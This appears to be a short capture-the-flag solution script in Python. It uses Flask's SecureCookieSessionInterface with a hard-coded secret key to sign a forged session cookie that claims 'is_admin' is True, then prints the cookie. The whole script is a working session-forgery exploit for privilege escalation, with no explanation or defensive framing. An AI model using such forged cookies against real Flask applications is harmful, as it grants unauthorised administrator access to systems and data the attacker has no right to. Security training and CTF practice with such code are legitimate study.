from flask.sessions import SecureCookieSessionInterface

def get_value():
    class App:
        secret_key = "420bf172a6297fc6558b8a6075af347a83b124ccd8551b181a62bac7aefef321"

    s = SecureCookieSessionInterface().get_signing_serializer(App)
    data = {"is_admin": True, "can_read_flag": False}
    return s.dumps(data)

value = get_value()
print(value)